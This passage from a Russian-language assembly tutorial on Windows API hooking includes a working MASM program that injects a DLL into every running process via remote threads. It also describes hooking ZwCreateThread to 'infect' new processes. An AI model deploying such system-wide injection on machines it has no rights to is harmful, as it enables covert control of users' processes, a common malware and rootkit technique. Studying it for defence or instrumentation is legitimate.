&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edx</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span>Len2<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span>Len2<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span>pStr2<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edx</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span>Len1<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">std</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">repe</span> <span style="color: #00007f; font-weight: bold;">cmpsw</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: black;">&#40;</span><span style="color: #46aa03; font-weight: bold;">ecx</span>==<span style="color: #ff0000;">0</span><span style="color: black;">&#41;</span>&amp;&amp;<span style="color: black;">&#40;</span><span style="color: #46aa03; font-weight: bold;">eax</span>==<span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: black;">&#41;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">edi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">esi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>else<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">edi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">esi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
CompareStringBackwards endp<br />
<br />
end <span style="color: #0000ff; font-weight: bold;">start</span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; End Program &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
&nbsp;</div>
<p>Пример Закончен.</p>
<h4><a name="c476"></a>Глобальный перехват</h4>
<p>Для установки в системе этого перехвата необходимо внедрить DLL в адресное пространство всех текущих процессов или просто скопировать код в Shell-код стиле (если мы не используем DLL), а также всех процессов, которые запустятся потом. Для внедрения во все текущие процессы используем  Toolhelp-функции для перечисления процессов. Также можно использовать функцию NtQuerySystemInformation, которая является Native для Toolhelp-функций, а также и для функций Enum... Вот код, который устанавливает перехват для всех запущенных процессов:</p>
<p>Пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Options and Includes&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: #ff0000;">.386</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
option casemap<span style="color: #339933;">:</span>none &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
<span style="color: #339933;">.</span>model <span style="color: #0000ff; font-weight: bold;">flat</span><span style="color: #339933;">,</span>stdcall &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
include \tools\masm32\include\windows<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
includelib \tools\masm32\lib\kernel32<span style="color: #339933;">.</span>lib &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
include \tools\masm32\include\kernel32<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
include \tools\masm32\include\user32<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
includelib \tools\masm32\lib\user32<span style="color: #339933;">.</span>lib &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
include \tools\masm32\include\advapi32<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
includelib \tools\masm32\lib\advapi32<span style="color: #339933;">.</span>lib &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Initialized Data Section&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: #0000ff; font-weight: bold;">.data</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
&nbsp; &nbsp; &nbsp; &nbsp; lib <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;c:\\dll.dll&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: black; font-style: italic;">;имя DLL, которую внедряем в чужой процесс</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; dwSize <span style="color: #0000ff; font-weight: bold;">equ</span> <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span>lib<span style="color: black; font-style: italic;">;Размер строки с именем DLL&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br />
&nbsp; &nbsp; &nbsp; &nbsp; kernelName <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;kernel32.dll&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: black; font-style: italic;">;Имя Kernel32.dll&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br />
&nbsp; &nbsp; &nbsp; &nbsp; loadlibraryName <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;LoadLibraryA&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: black; font-style: italic;">;Имя функции LoadLibraryA&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br />
&nbsp; &nbsp; &nbsp; &nbsp; _LoadLibrary <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">0</span><span style="color: black; font-style: italic;">;Адрес функции LoadLibrary &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br />
&nbsp; &nbsp; &nbsp; &nbsp; ParameterForLoadLibrary <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">0</span><span style="color: black; font-style: italic;">;Адрес строки с именем DLL в чужом процессе </span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Uninitialized Data Section&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: #0000ff; font-weight: bold;">.data</span>?&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; ThreadId <span style="color: #0000ff; font-weight: bold;">dd</span> ?<span style="color: black; font-style: italic;">;Идентификатор треда &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br />
&nbsp; &nbsp; &nbsp; &nbsp; hSnap <span style="color: #0000ff; font-weight: bold;">dd</span> ?<br />
&nbsp; &nbsp; &nbsp; &nbsp; hProcess <span style="color: #0000ff; font-weight: bold;">dd</span> ?<br />
&nbsp; &nbsp; &nbsp; &nbsp; ProcEntry PROCESSENTRY32 &lt;?&gt;<br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Code Section&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">code</span><br />
ThreadProc proc<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke Sleep<span style="color: #339933;">,</span><span style="color: #ff0000;">100000</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
ThreadProc endp<br />
<span style="color: #0000ff; font-weight: bold;">start</span><span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke CreateToolhelp32Snapshot<span style="color: #339933;">,</span>TH32CS_SNAPPROCESS<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> hSnap<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> ProcEntry<span style="color: #339933;">.</span>dwSize<span style="color: #339933;">,</span>sizeof PROCESSENTRY32<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke Process32First<span style="color: #339933;">,</span>hSnap<span style="color: #339933;">,</span>offset ProcEntry<br />
NextProcess<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke OpenProcess<span style="color: #339933;">,</span>PROCESS_CREATE_THREAD <span style="color: #00007f; font-weight: bold;">or</span> PROCESS_VM_WRITE <span style="color: #00007f; font-weight: bold;">or</span> PROCESS_VM_OPERATION<span style="color: #339933;">,</span>\<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">0</span><span style="color: #339933;">,</span>ProcEntry<span style="color: #339933;">.</span>th32ProcessID<span style="color: black; font-style: italic;">;Открываем процесс куда будем внедрять DLL</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> hProcess<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke GetModuleHandle<span style="color: #339933;">,</span>offset kernelName<span style="color: black; font-style: italic;">;Получаем описатель модуля Kernel32.dll</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke GetProcAddress<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>offset loadlibraryName<span style="color: black; font-style: italic;">;Получаем адрес функции LoadLibrary</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> _LoadLibrary<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Выделяем память в удаленном процессе</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke VirtualAllocEx<span style="color: #339933;">,</span>hProcess<span style="color: #339933;">,</span>NULL<span style="color: #339933;">,</span>dwSize<span style="color: #339933;">,</span>MEM_RESERVE <span style="color: #00007f; font-weight: bold;">or</span> MEM_COMMIT<span style="color: #339933;">,</span>PAGE_READWRITE<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> ParameterForLoadLibrary<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Запись строки с именем DLL в АП чужого процесса</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke WriteProcessMemory<span style="color: #339933;">,</span>hProcess<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>offset lib<span style="color: #339933;">,</span>dwSize<span style="color: #339933;">,</span>NULL<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Создаем удаленный поток, который вызывает LoadLibrary, </span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;тем самым внедряем DLL в адресное пространство чужого процесса. &nbsp;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke CreateRemoteThread<span style="color: #339933;">,</span>hProcess<span style="color: #339933;">,</span>NULL<span style="color: #339933;">,</span>NULL<span style="color: #339933;">,</span>_LoadLibrary<span style="color: #339933;">,</span>ParameterForLoadLibrary<span style="color: #339933;">,</span>\<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NULL<span style="color: #339933;">,</span>offset ThreadId<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke Process32Next<span style="color: #339933;">,</span>hSnap<span style="color: #339933;">,</span>offset ProcEntry<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: #46aa03; font-weight: bold;">eax</span>!=<span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> NextProcess<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke ExitProcess<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
end <span style="color: #0000ff; font-weight: bold;">start</span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; End Program &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
&nbsp;</div>
<p>Пример Закончен.</p>
<p>Чтобы глобально перехватывать функции можно использовать функцию SetWindowsHook. Тогда мы будет перехватывать нужную функцию во всех текущих GUI-приложениях, а также новых, т.к. если мы вызываем функцию SetWindowsHook, то она внедряет DLL и для всех новых процессов.</p>
<p>Другой способ в следующем. Необходимо перехватывать функции, которые создают процесс или которые вызываются при создании процесса. Т.о. мы будет устанавливать перехват и для всех новых процессов. В ОС Windows существует много функций, которые создают процессы - SHELL32.DLL!ShellExecute, KERNEL32.DLL!CreateProcess, NTDLL.DLL!NtCreateProcess. Нам необходимо выяснить какие действия происходят при создании любого процесса, используя любую из функций создания процессов в ОС.</p>
<p>Какой бы функцией не был создан процесс, при создании процесса вызывается функция ZwCreateThread. Вот ее прототип:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">ZwCreateThread proc ThreadHandle1<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> DesiredAccess<span style="color: #339933;">:</span> <span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> \<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ObjectAttributes<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> ProcessHandle<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> \<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ClientId<span style="color: #339933;">:</span> <span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> ThreadContext<span style="color: #339933;">:</span> <span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> \<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; UserStack<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> CreateSuspended<span style="color: #339933;">:</span> <span style="color: #0000ff; font-weight: bold;">DWORD</span></div>
<p>В параметре ClientId содержиться указатель на структуру, которая называется CLIENTID. Она определена так:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">CLIENTID struct<br />
&nbsp; &nbsp; &nbsp; &nbsp; UniqueProcess &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> <span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; UniqueThread&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> <span style="color: #ff0000;">0</span><br />
CLIENTID ends<br />
&nbsp;</div>
<p>UniqueProcess - это идентификатор процесса в котором создается поток. Делаем так: в обработчике ZwCreateThread после вызова нормальной функции ZwCreateThread проверяем UniqueProcess из структуры CLIENTID. Если это значение отличается от идентификатора нашего процесса, то заражаем процесс. Но не тут-то было!!! При заражении процесса вызов LoadLibrary окажется неудачным, потому что процесс еще не проинициализирован. Таким образом если идентификаторы нашего процесса и нового не совпали, то мы просто устанавливаем флажок NewProcess. А мы знаем, что при создании процесса основной поток приостановлен  до тех пор, пока процесс не будет проинициализирован. После того как новый процесс будет проинициализирован для основного потока вызывается функция ZwResumeThread. Значит и ее тоже надо перехватывать. Я сделал 2 макроса, которые сохраняют и соответственно восстанавливают регистры ESI, EDI, EBX, EBP. Вот эти макросы:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">startproc macro<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">esi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">edi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">ebx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">ebp</span><br />
endm<br />
<br />
endproc macro<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">ebp</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">ebx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">edi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">esi</span><br />
endm<br />
&nbsp;</div>
<p>Взгляните на обработчик ZwCreateThread:</p>
<p>Пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">NewZwCreateThread proc ThreadHandle1<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> DesiredAccess<span style="color: #339933;">:</span> <span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> \<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ObjectAttributes<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> ProcessHandle<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> \<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ClientId<span style="color: #339933;">:</span> <span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> ThreadContext<span style="color: #339933;">:</span> <span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> \<br />
